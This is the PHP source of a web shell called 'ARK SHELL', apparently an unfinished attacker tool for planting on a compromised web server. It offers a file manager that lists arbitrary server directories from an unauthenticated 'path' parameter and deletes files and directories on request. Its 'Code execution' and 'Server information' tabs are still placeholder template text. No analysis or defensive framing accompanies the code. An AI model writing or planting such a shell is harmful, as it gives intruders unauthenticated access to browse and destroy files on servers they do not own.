<?php

if (function_exists("getcwd")) {
	define("ROOT_PATH", getcwd());
} else {
	define("ROOT_PATH", $_SERVER['DOCUMENT_ROOT'].$_SERVER['REQUEST_URI']);
}

define("ROOT_FILE", $_SERVER['SCRIPT_NAME']);

if (!isset($_GET['path'])) {
	$_GET['path'] = '/';
}

if (function_exists("scandir")) {
	$files = scandir($_GET['path']);
}

if (isset($_POST['delfile'])) {

	unlink($_POST['delfile']);

}

if (isset($_POST['deldir'])) {

	rmdir($_POST['deldir']);

}

?>

<!DOCTYPE html>
<html>
<head>
	<title>ARK SHELL</title>
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"> 
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<style type="text/css">
		.web-view {
			height: 540px;
		}

		.col-correct {
			float: none !important;
			padding: 0 !important;
		}
		table.highlight > tbody > tr:hover {
  			background-color: rgba(255, 255, 255, 0.1);
  		}
	</style>
</head>
<body class="blue-grey darken-4">


	<nav class="nav-extended blue-grey darken-3">
		<div class="nav-content">
			<ul class="tabs tabs-transparent">
				<li class="tab"><a <?php if (isset($_GET['active']) && $_GET['active'] == 'as') { echo 'class="active"'; } ?> onclick="redirection('as')" href="#ark"><b>ARK SHELL</b></a></li>
				<li class="tab"><a <?php if (isset($_GET['active']) && $_GET['active'] == 'fm') { echo 'class="active"'; } ?> onclick="redirection('fm')" href="#file-manager"><b>File manager</b></a></li>
				<li class="tab"><a <?php if (isset($_GET['active']) && $_GET['active'] == 'ce') { echo 'class="active"'; } ?> onclick="redirection('ce')" href="#test1">Code execution</a></li>
				<li class="tab"><a <?php if (isset($_GET['active']) && $_GET['active'] == 'si') { echo 'class="active"'; } ?> onclick="redirection('si')" href="#test2">Server information</a></li>
			</ul>
		</div>
	</nav>

	<div class="container">

<?php

?>

		<div id="ark" class="col s12">
			<div class="row"></div>
			<div class="row"></div>
			<div class="row"></div>
			<div class="row">
				<div class="col s12">
					<div class="card blue-grey darken-3">
						<div class="card-content white-text">
							<span class="card-title center"><b>WEBSITE VIEW</b></span>
							<div class="row"></div>
							<iframe id="webview" class="web-view col-correct col s10 offset-s1" src="<?php echo ROOT_FILE; ?>"></iframe>
							<a id="refresh-page" class="blue col-correct waves-effect waves-light btn col s2 offset-s9">refresh page</a>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div id="file-manager" class="col s12">
			<div class="row"></div>
			<div class="row"></div>
			<div class="row"></div>
			<div class="row">
				<div class="col s12">
					<div class="card blue-grey darken-3">
						<div class="card-content white-text">
<?php
if (function_exists("scandir")) {
?>
							<span class="card-title center"><b>SERVER TREE</b></span>
							<div class="row"></div>
							<table class="highlight">
        						<thead>
          							<tr>
              							<th>Name</th>
              							<th>Type</th>
              							<th>Size</th>
              							<th>Action</th>
          							</tr>
        						</thead>

        						<tbody>
<?php
	foreach ($files as $file) {
?>
          							<tr>
<?php
		if (is_dir($_GET['path'].$file)) {

			if ($file == '..') {
				$path_array = preg_grep("/\/.*\//", $_GET['path']);
				if ($_GET['path'] != '/') {
					$new_path = substr($_GET['path'], 0, -1);
				} else {
					$new_path = $_GET['path'];
				}
				while (substr($new_path, strlen($new_path)-1) != '/') {
					$new_path = substr($new_path, 0, -1);
				}
?>
            							<td><a href="?path=<?php echo $new_path; ?>&active=fm"><?php echo $file; ?></a></td>
<?php
			} else if ($file == '.') {
?>
										<td><a href="?path=<?php echo $_GET['path']; ?>&active=fm"><?php echo $file; ?></a></td>
<?php
			} else {
?>
										<td><a href="?path=<?php echo $_GET['path'].$file; ?>/&active=fm"><?php echo $file; ?></a></td>
<?php
			}
?>
            							<td>Directory</td>
										<td>-</td>
<?php
			if ($file != '.' && $file != '..') {
?>
										<td><a href="?path=<?php echo $_GET['path']; ?>&deldir=<?php echo $_GET['path']; ?>&active=fm"><i class="material-icons red-text">delete</i></a></td>
<?php
			} else {
?>
										<td>-</td>
<?php
			}

		} else {
?>
										<td><?php echo $file; ?></td>
										<td>File</td>
										<td><?php echo round(filesize($_GET['path'].$file)/1000, 1); ?> Ko</td>
										<td><a href="?path=<?php echo $_GET['path']; ?>&editfile=<?php echo $_GET['path'].$file; ?>&active=fm"><i class="material-icons green-text">edit</i></a> <a href="?path=<?php echo $_GET['path']; ?>&delfile=<?php echo $_GET['path'].$file; ?>&active=fm"><i class="material-icons red-text">delete</i><a></td>
<?php
		}
?>
          							</tr>
<?php
	}
?>
        						</tbody>
      						</table>
<?php
} else {
?>
							<span class="card-title center red-text"><b>Scandir function is disabled</b></span>
<?php
}
?>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div id="test1" class="col s12">
			<div class="row"></div>
			<div class="row"></div>
			<div class="row"></div>
			<div class="row">
				<div class="col s12">
					<div class="card blue-grey darken-3">
						<div class="card-content white-text">
							<span class="card-title">Code manager</span>
							<p>I am a very simple card. I am good at containing small bits of information.
							I am convenient because I require little markup to use effectively.</p>
						</div>
						<div class="card-action">
							<a href="#">This is a link</a>
							<a href="#">This is a link</a>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div id="test2" class="col s12">
			<div class="row"></div>
			<div class="row"></div>
			<div class="row"></div>
			<div class="row">
				<div class="col s12">
					<div class="card blue-grey darken-3">
						<div class="card-content white-text">
							<span class="card-title">Server tree</span>
							<p>I am a very simple card. I am good at containing small bits of information.
							I am convenient because I require little markup to use effectively.</p>
						</div>
						<div class="card-action">
							<a href="#">This is a link</a>
							<a href="#">This is a link</a>
						</div>
					</div>
				</div>
			</div>
		</div>

	</div>

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
	<script type="text/javascript">
		$(document).ready(function(){
			$('.tabs').tabs();

			$('#refresh-page').click(function() {
    			$('#webview').attr('src', $('#webview').attr('src'));
    			return false;
			});


		});

		function redirection(page) {

			window.location.href = location.protocol + '//' + location.host + location.pathname + "?path=" + <?php echo json_encode($_GET['path']); ?> + "&active=" + page

		}

		function delfile(file) {



		}

		function deldir(dir) {



		}
	</script>
</body>
</html>